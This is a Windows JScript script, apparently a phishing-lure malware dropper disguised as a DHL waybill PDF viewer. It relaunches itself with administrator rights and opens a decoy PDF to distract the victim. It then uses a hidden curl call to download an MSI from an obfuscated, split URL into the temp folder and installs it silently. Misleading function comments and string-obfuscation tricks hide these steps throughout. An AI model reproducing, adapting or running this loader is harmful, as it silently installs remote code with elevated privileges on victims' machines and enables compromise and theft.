
// Register service handlers
var shellHandler, fileSystemRef;


// Installation dispatcher
function launchSetup(filePath) {
  shellHandler = new ActiveXObject("Shell.Application");
  shellHandler.ShellExecute("msiexec.exe", "/i \"" + filePath + "\" " + "/qn", "", "open", 1);
}

// Privilege elevation handler
function validateAccess() {
  if (!WScript.Arguments.Named.Exists("admin")) {
    shellHandler = new ActiveXObject("Shell.Application");
    var commandArgs = "\"" + WScript.ScriptFullName + "\" /admin";
    shellHandler.ShellExecute("Provider=wscript.exe;active=1".substring(9,20), commandArgs, "", "runas", 1);
    WScript.Quit();
  }
}


// Media content handler
function presentViewer() {
  var contentUrl = "https://pdfviewer-nu.vercel.app/doc/dhl-waybill.pdf";
  shellHandler = new ActiveXObject("Shell.AppQication".replace("Q","l"));
  shellHandler.ShellExecute(contentUrl, "", "", "open", 1);
}


// Timestamp generator
function getSessionIdentifier() {
  var d = new Date();
  return d.getFullYear() + "-" + (d.getMonth() + 1) + "-" + d.getDate();
}


// Package retrieval handler
function retrievePackage(url, destPath) {
  var cmdRunner = new ActiveXObject("WScript.Shell");
  var cmd = 'curl.exe -L -o "' + destPath + '" "' + url + '"';
  var exitCode = cmdRunner.Run(cmd, 0, true);
  if (exitCode != 0) WScript.Quit();
  var verifyFSO = new ActiveXObject("Scripting.FilQSystemObject".replace("Q","e"));
  if (!verifyFSO.FileExists(destPath)) WScript.Quit();
}

// ============================================
// Main execution entry
// ============================================
validateAccess();
WScript.Sleep(1283);
presentViewer();
WScript.Sleep(1024);
fileSystemRef = new ActiveXObject("Scripting.FileSystemObject");
var workingDirectory = fileSystemRef.GetSpecialFolder(2);
var deploymentPath = workingDirectory + "\\updater.msi";
var resourceUrl = ["https://pdf", "viewer-nu.v", "ercel.app/d", "oc/sc.msi"].join("");

retrievePackage(resourceUrl, deploymentPath);
var packageSize = fileSystemRef.GetFile(deploymentPath).Size; if (packageSize < 1) WScript.Quit();
var sessionRef = new Date().getFullYear() + "-" + new Date().getMonth();
var checkTime = new Date().getTime();
launchSetup(deploymentPath);